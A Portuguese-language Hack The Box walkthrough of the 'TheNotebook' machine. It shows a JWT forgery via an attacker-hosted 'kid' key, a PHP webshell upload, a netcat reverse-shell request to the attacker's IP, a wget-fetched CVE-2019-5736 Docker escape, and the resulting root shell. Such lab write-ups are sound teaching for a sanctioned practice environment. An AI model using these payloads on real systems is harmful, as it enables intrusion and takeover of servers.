---
title: "Walktrough: HTB TheNotebook"
namespace: htb-thenotebook
language: pt-BR
category: Walkthrough
tags:
  - HackTheBox
  - HTB Medium
  - HTB Linux
date: 2021-07-31 12:00:00
header:
  teaser: https://i.imgur.com/Arm1Pyr.png
  og_image: https://i.imgur.com/Arm1Pyr.png
redirect_from: /writeup/2021/07/htb-thenotebook
---

Olá pessoal!

A máquina desta semana será **TheNotebook**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [mostwanted002](https://app.hackthebox.eu/users/120514).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
{: .notice--info}

![HTB TheNotebook](https://i.imgur.com/DSrrFJP.png){: .align-center}

Esta máquina foi bem interessante onde tive a oportunidade de conhecer mais sobre JWT Tokens no caminho de um acesso inicial e sobre outras técnicas para docker escaping, abusando de capabilities para obter a flag de root.

## Enumeração

Como de costume, iniciamos com um scan rápido do `nmap` para verificar quais serviços temos publicados nesta máquina

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.230                                                                                       
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 15:05 -03
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.230
Host is up (0.072s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

### 80/TCP - Serviço HTTP

Acessando a página, notei que se tratava de um site HTTP simples, que utiliza o [Bootstrap](https://getbootstrap.com/) padrão, porém nenhum link ou indício de se tratar de algum framework como WordPress ou qualquer outro tipo de CMS.

![HTB TheNotebook - 80/TCP](https://i.imgur.com/kJx4QaU.png){: .align-center}

O que imaginava se confirmou com a execução do `whatweb`, que listou apenas dados dos componentes já reconhecidos e servidor de apresentação, no caso o *Nginx*.

```bash
$ whatweb 10.10.10.230
http://10.10.10.230 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.10.230], Title[The Notebook - Your Note Keeper], nginx[1.14.0]
```

Analisando o site com o `gobuster` encontrei as seguintes páginas da aplicação, as mesmas observadas durante uma navegação normal, conforme inspeção preliminar.

```bash
$ gobuster dir -u http://10.10.10.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -t 50 -o gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.230
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2021/06/10 16:04:30 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1250]
/register             (Status: 200) [Size: 1422]
/admin                (Status: 403) [Size: 9]
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]

===============================================================
2021/06/10 16:34:27 Finished
===============================================================
```

Como não encontrei nada específico da aplicação, decidi interagir um pouco com ela enquanto inspecionava as requisições utilizando o Burp Suite, a fim de identificar alguma eventual forma de exploração.

Iniciei por criar uma conta, clicando no link *Register*, onde me foram solicitadas informações básicas, conforme imagem abaixo, as quais após submissão resultaram na criação da conta sem maiores problemas.

![HTB TheNotebook - SignUp](https://i.imgur.com/e49Cij7.png){: .align-center}

Após criada conta, fui redirecionado para uma página onde tinha a possibilidade de criar algumas notas, porém interagindo com estes recursos, não observei nenhum tipo de possibilidade de injeção, a menos que seja passível de algum tipo de **SSTI** (Server-Side Template Injection), uma vez que as notas são renderizadas na página.

![HTB TheNotebook - Logged User](https://i.imgur.com/hPKhMaT.png){: .align-center}

Analisando mais profundamente as requisições, desde o processo de criação da conta, notei que nada poderia a princípio durante o registro do usuário, porém a resposta do webserver após esta ação que me chamou atenção. Nesta resposta recebemos uma instrução `Set-Cookie` definindo um cookie chamado `auth`, que continha em seu valor uma string que se assemelhava a um **Token JWT**.

```http
HTTP/1.1 302 FOUND
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 10 Jun 2021 20:46:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://10.10.10.230/
Connection: close
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjowfQ.Ixm8_VYcfY_WAv0L7i27vyOW15dd2UuhhlOrRaSiwVFyge6_JmC2FjUEYHNh_j4xXFjfaeUR7gkifezXjsJwz99U1zpcp0CaOI9-RWXLSTpnZvprcCCyN5seCkJHNx45-Qb5mCjGDGQbrxkrcUuV8tVcdkEpFi90BfXL6XGGxJe-Ms6YiDWK1fhpaGfKXcRyAYUGWoTs62ulrVwV5fKhH978OE17egmvNWpOL0dNpmpdoCTTKYBX1KDyyFMWJvZWkydPCNPPAaqk0pNxSwiWOYzBBErx2EBd58gpZWlBLNf5JnjyoBXdHt4JdHVcpoZsmBsAT_gxRU_uffzwxTNQN9-vrsA7tLzWuyWWt32s_8hGGrauEBSW4aPP5xRbpGclDfw2KPa7qHdVa5SApHHQrDFfpxhU2hFjvjlBtmwfjJbNHb53ZRXmz0SPRLKf6sOpX3Iswld58yBYP9xtIr3eCsdW1boCsDflfjUi9LQqsM3d_PTgGgzBLIXBQXXj82i0CzlwD3rYl3AjR7IBgBZNee5HJVdNUPYx6e_uG7WU94LUBy7WsfPfYY8VHjbuWVY1Nq3Wqhg2Sb04XmWBbtbV5C12YOu-oA7A6KrloeGOjLHkIlTsnLAj3eNhl_eo5aiLuQL3P5HrGr0K_rrniLHTCGTWX3KM4qgtI57IsbXN0Dw; Path=/
Set-Cookie: uuid=796e6cc3-aa50-4f87-b74f-408146886c66; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
```

Analisando seu conteúdo no site [jwt.ms](https://jwt.ms/), notei detalhes muito relevantes e que poderia nos permitir elevar nosso privilégio:

- Cabeçalho `kid`, que define o caminho da chave privada em um HTTP server em execução no application server, possivelmente utilizado para assinar e validar os tokens;
- Payload `admin_cap`, que possivelmente contém um valor binário ou sequencial, que define o **nível de privilégio** do usuário, que no caso do usuário recém-criado, é 0.

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}.{
  "username": "jdoe",
  "email": "jdoe@dummy.com",
  "admin_cap": 0
}.[Signature]
```

O fato neste momento é: Não podemos modificar o token emitido sem assiná-lo novamente com a mesma chave presente no servidor, porém, uma vez que o token traz consigo a URI da chave utilizada para sua assinatura e validação, pode ser que tenhamos alguma chance recriando este token, assinando com uma chave RSA própria e **publicá-la para que o backend possa acessá-lo**, mas isso só poderemos confirmar testando :stuck_out_tongue_winking_eye:.

## Acesso inicial

Uma vez que precisamos criar um token, buscando por uma forma simples de fazê-lo, encontrei uma biblioteca em python chamada [PyJWT](https://pyjwt.readthedocs.io/en/stable/) que me pareceu bem simples de ser utilizada. Na página inicial da documentação temos um exemplo demonstrando o processo de assinatura de um token simples, porém precisamos validar como adicionar o header necessário (neste caso o valor `kid`) e criar o certificado.

Alcancei o objetivo acima a partir da execução dos seguintes passos:

- Criação da chave RSA conforme linhas de comando abaixo. Teremos como output o conteúdo da chave pública e, no arquivo especificado, a chave privada.

```bash
openssl req -nodes -new -x509 -keyout privKey.key -noout -pubkey
```

- Publicação da chave utilizando um python HTTP Server simples, a ser especificado no token, para que o webserver busque pelo menos durante o processo de validação.

```bash
python3 -m http.server 7070
```

- Após a criação da chave, criado um script, conforme conteúdo abaixo, utilizando os valores dos arquivos de chave pública e privada e assinando o payload. Este script utiliza exemplos da página [Usage Examples](https://pyjwt.readthedocs.io/en/stable/usage.html) da documentação oficial da biblioteca.

  - Necessário instalar o modulo utilizado com o comando `pip3 install pyjwt`. Caso o module `jwt` esteja instalado, necessário removê-lo antes da instalação deste módulo

```python
#!/usr/bin/python3
import jwtprivate_key = b"""-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDT/8rR3ZkWJOJN
[...]
XDmj7j8p7kdd2ZM1MYTO6A0=
-----END PRIVATE KEY-----"""
payload = {
    "username": "jdoe",
    "email": "jdoe@dummy.com",
    "admin_cap": 1
}
header = {"kid": "http://10.10.10.10:7070/privKey.key"}
encoded = jwt.encode(payload, private_key, algorithm="RS256",headers=header)
print(encoded)
```

  Um exemplo do output se encontra abaixo, o que pode ser validado conforme exemplo abaixo:

```bash
$ python3 generate-jwt.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg
```

- O token gerado pelo conteúdo acima, conforme JWT.ms, gerou o payload abaixo:

```json
{
    "typ": "JWT",
    "alg": "RS256",
    "kid": "http://10.10.10.10:7070/privKey.key"
}.{
    "username": "jdoe",
    "email": "jdoe@dummy.com",
    "admin_cap": 1
}.[Signature]
```

- Uma vez que os parâmetros foram gerados conforme esperado, é chegado o momento de alterar o valor do cookie no navegador e **:boom:**: um request do backend foi recebido no HTTP server para validar a sua assinatura e agora podemos ver a opção **Admin Panel** ao acessar o portal :smile:

```bash
python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...10.10.10.230 - - [10/Jun/2021 18:45:24] "GET /privKey.key HTTP/1.1" 200 -
```

![HTB TheNotebook - Admin Panel](https://i.imgur.com/NrGXJx9.png){: .align-center}

- Analisando o conteúdo do que é possível se fazer na aplicação a partir do painel administrativo, temos duas opções básicas: listar as notas existentes e realizar o upload de um arquivo.

![HTB TheNotebook - Admin Options](https://i.imgur.com/fSYkzLZ.png){: .align-center}

- Analisando a seção *View Notes*, pudemos listar todas as notas da aplicação, conforme abaixo. Destaque para as notas do usuário **admin** que cita a existência de backup deste servidor e que existe uma **vulnerabilidade de arquivos PHP sendo executados** pelo servidor de apresentação:

| Title                 | Note                                                         | Owner |
| --------------------- | ------------------------------------------------------------ | ----- |
| Need to fix config    | Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server. | admin |
| Backups are scheduled | Finally! Regular backups are necessary. Thank god it's all easy on server. | admin |
| The Notebook Quotes   | "I am nothing special, of this I am sure. I am a common man with common thoughts and I've led a common life. There are no monuments dedicated to me and my name will soon be forgotten, but I've loved another with all my heart and soul, and to me, this has always been enough.." ― Nicholas Sparks, The Notebook "So it's not gonna be easy. It's going to be really hard; we're gonna have to work at this everyday, but I want to do that because I want you. I want all of you, forever, everyday. You and me... everyday." ― Nicholas Sparks, The Notebook "You can't live your life for other people. You've got to do what's right for you, even if it hurts some people you love." ― Nicholas Sparks, The Notebook "You are, and always have been, my dream." ― Nicholas Sparks, The Notebook "You are my best friend as well as my lover, and I do not know which side of you I enjoy the most. I treasure each side, just as I have treasured our life together." ― Nicholas Sparks, The Notebook "I love you. I am who I am because of you. You are every reason, every hope, and every dream I've ever had, and no matter what happens to us in the future, everyday we are together is the greatest day of my life. I will always be yours. " ― Nicholas Sparks, The Notebook "We fell in love, despite our differences, and once we did, something rare and beautiful was created. For me, love like that has only happened once, and that's why every minute we spent together has been seared in my memory. I'll never forget a single moment of it." ― Nicholas Sparks, The Notebook | noah  |
| Is my data safe?      | I wonder is the admin good enough to trust my data with?     | noah  |

Já que possivelmente arquivos do tipo PHP sejam interpretados pelo servidor, decidi realizar um teste, onde os passos abaixo foram executados:

- Acessando a opção *File Upload* temos uma página simples para envio de arquivos, a qual vamos inspecionar as requisições a partir do Burp Suite

  ![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png){: .align-center}

  - Criando um payload PHP para webshell simples com o conte conteúdo `<?php system($_GET['cmd']);?>`, tentei realizar seu upload a partir do formulário e não tive nenhum tipo de bloqueio nesta ação.

  - Após upload, o arquivo foi listado na página e no botão *View* relacionado, o caminho onde poderia acessar o conteúdo enviado.

  ![HTB TheNotebook - Uploaded Files](https://i.imgur.com/aCdIwnN.png){: .align-center}

  - Ao copiar a URI deste arquivo, realizando chamadas simples com o queryString `cmd=id`, conforme previsto no payload criado, pude constatar que poderíamos obter um shell reverso deste modo já que obtemos execução remota de código :smiley:

  ![HTB TheNotebook - Simple WebShell](https://i.imgur.com/eSH3rQY.png){: .align-center}

  - Por fim, para obter um shell reverso em si, iniciei um listener usando o `nc` e executei a chamada abaixo, onde obtive o sucesso esperado :smile:

```http
GET /1e49f8a12603040cc99b2dd39f423b09.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.10.10+4443+>/tmp/f HTTP/1.1
Host: 10.10.10.230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg; uuid=d3f32390-d9e4-4eb0-b1a0-788b54fd8278
Connection: close
```

## User flag

Após obter o shell reverso, iniciada enumeração da máquina com a conta `www-data`, a qual é utilizada para execução do webserver. Os seguintes itens foram listados após execução do `linpeas.sh`:

- Usuários com console e suas permissões

  - `noah:x:1000:1000:Noah:/home/noah:/bin/bash`
  - `root:x:0:0:root:/root:/bin/bash`

- Existência da pasta `/var/backups`, inclusive mencionada durante as notas obtidas anteriormente

Com este item também foi mencionado nas notas encontradas na aplicação, iniciando pela inspeção dos arquivos em `/var/backups`, notei que temos alguns arquivos aos quais não temos acesso, porém um deles me chamou a atenção, sendo o arquivo `home.tar.gz`, com acesso de leitura global, possivelmente contendo algum tipo de informação.

```bash
www-data@thenotebook:/var/backups$ ls -la
total 696
drwxr-xr-x  2 root root     4096 Jun 11 06:26 .
drwxr-xr-x 14 root root     4096 Feb 12 06:52 ..
-rw-r--r--  1 root root    51200 Jun 11 06:25 alternatives.tar.0
-rw-r--r--  1 root root    33252 Feb 24 08:53 apt.extended_states.0
-rw-r--r--  1 root root     3609 Feb 23 08:58 apt.extended_states.1.gz
-rw-r--r--  1 root root     3621 Feb 12 06:52 apt.extended_states.2.gz
-rw-r--r--  1 root root      437 Feb 12 06:17 dpkg.diversions.0
-rw-r--r--  1 root root      172 Feb 12 06:52 dpkg.statoverride.0
-rw-r--r--  1 root root   571460 Feb 24 08:53 dpkg.status.0
-rw-------  1 root root      693 Feb 17 13:18 group.bak
-rw-------  1 root shadow    575 Feb 17 13:18 gshadow.bak
-rw-r--r--  1 root root     4373 Feb 17 09:02 home.tar.gz
-rw-------  1 root root     1555 Feb 12 06:24 passwd.bak
-rw-------  1 root shadow   1024 Feb 12 07:33 shadow.bak
```

Ao extrair o conteúdo deste arquivo, notado que temos algumas informações importantes que vão nos ajudar a obter acesso com a conta do usuário `noah`, sendo este um backup de seu home directory.

```bash
$ tar -xzvf home.tar.gz
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
```

Executando o comando abaixo, com o arquivo obtido do backup, foi possível conectar-se via ssh com a conta `noah` e obter a flag de user

```bash
$ ssh -i id_rsa noah@10.10.10.230
noah@thenotebook:~$ cat user.txt
<redacted>
```

## Root flag

Como de costume, antes de refazer a enumeração com `linenum.sh`, executado o comando `sudo -l` na máquina, o que retornou o seguinte conteúdo:

```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Uma vez que tínhamos acesso para executar quaisquer comandos para este container em execução, `webapp-dev01`, segui com a execução do comando abaixo, o que me permitiu conectar como `root` dentro do container.

```bash
sudo /usr/bin/docker exec -it webapp-dev01 bash
```

No conteúdo deste container, temos os arquivos utilizados na publicação do website, onde vamos buscar por informações sensíveis

```bash
root@7228ddf52a0f:/opt/webapp# ls -la
total 2244
drwxr-xr-x 1 root root    4096 Jun 11 07:04 .
drwxr-xr-x 1 root root    4096 Feb 12 07:30 ..
drwxr-xr-x 1 root root    4096 Feb 12 07:30 __pycache__
drwxr-xr-x 3 root root    4096 Nov 18  2020 admin
-rw-r--r-- 1 root root    3303 Nov 16  2020 create_db.py
-rwxr-xr-x 1 root root 2236814 Jun 11 07:04 main
-rw-r--r-- 1 root root    9517 Feb 11 15:00 main.py
-rw------- 1 root root    3247 Feb 11 15:09 privKey.key
-rw-r--r-- 1 root root      78 Feb 12 07:12 requirements.txt
drwxr-xr-x 3 root root    4096 Nov 19  2020 static
drwxr-xr-x 2 root root    4096 Nov 18  2020 templates
-rw-r--r-- 1 root root      20 Nov 20  2020 webapp.tar.gz
```

Analisando especificamente o conteúdo do arquivo `create_db.py` notei que temos dois hashes de senha para os usuários `noah` e `admin`, os quais decidi buscar na internet se já haviam sido resolvidos.

```python
 users = [
        User(username='admin', email='admin@thenotebook.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"),
        User(username='noah', email='noah@thenotebook.local', uuid=noah_uuid, password="e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2")
    ]
```

Como não encontrei estas hashes em nenhum site público (Crackstation, por exemplo) significa que não devem ser senhas de wordlists conhecidas, como a `rockyou.txt`, frequentemente utilizada em CTFs. Decidi então partir para enumeração de possíveis vulnerabilidades de *docker breakout*, ou seja, escapar do container para o host docker.

Buscando por alguns materiais, encontrei o repositório [stealthcopter/deepce: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) (github.com)](https://github.com/stealthcopter/deepce) onde o script promete auxiliar na enumeração de características vulneráveis que permita esse tipo de ação.

Ao executá-lo no container, notei que tínhamos alguma chance dada alguns capabilities (em vermelho na imagem) que permitiriam que tanto realizasse a leitura como também a escrita de arquivos no host, porém após múltiplas tentativas não obtive o sucesso esperado.

![HTB TheNotebook - deepce output](https://i.imgur.com/0L7480D.png){: .align-center}

Como não encontrei nada muito relevante nos arquivos, decidi buscar por outras vulnerabilidades que permitiriam escapar do docker, onde acabei encontrando o CVE-2019-5736 enquanto navegava nas vulnerabilidades relacionadas ao produto **docker** no site [CVE Details]. Esta vulnerabilidade menciona justamente o que procuramos e dado ao seu alto score (CVSS 9.3) talvez exista algum exploit pronto.

![CVE Details - CVE-2019-5736](https://i.imgur.com/CqvPKK3.png){: .align-center}

Buscando por exploits encontrei o repositório [Frichetten/CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com)](https://github.com/Frichetten/CVE-2019-5736-PoC) uma PoC escrita em Golang que supostamente se adequaria bem em nosso cenário, uma vez que outras PoCs existentes dependiam da execução do `docker run` como root.

Para obter o shell de root, os passos seguintes foram executados, conforme visto neste blog post ([Reproduction of docker escape vulnerability (CVE-2019-5736) - Programmer Sought](https://www.programmersought.com/article/71804432772/))

- Baixado e editado o script com o payload para execução de shell reverso, chamado `escape.go`

- Compilado utilizando os parâmetros selecionados

```plaintext
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build escape.go
```

- Copiado exploit para a máquina vítima, dentro do container, seguido da sua execução

```bash
wget http://10.10.10.10/escape
chmod +x escape
./escape
```

- Uma vez que o exploit substitui `/bin/sh` da máquina por um shell script malicioso, executado a linha de comando a seguir para iniciar o trigger para a exploração

```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

Após execução, foi recebido um shell reverso no listener que havia sido iniciado e obtido flag de root desta máquina

```bash
$ sudo nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.230] 35856
bash: cannot set terminal process group (1617): Inappropriate ioctl for device
bash: no job control in this shell
<4de4eaff90e275467ff2103ff7b6eb2b1ffaf63d44f72a2b2# id
id
uid=0(root) gid=0(root) groups=0(root)
root@thenotebook:/root# cat root.txt
\cat root.txt
<redacted>
```

Espero que tenham gostado!

Vejo voces no proximo post! :smiley:
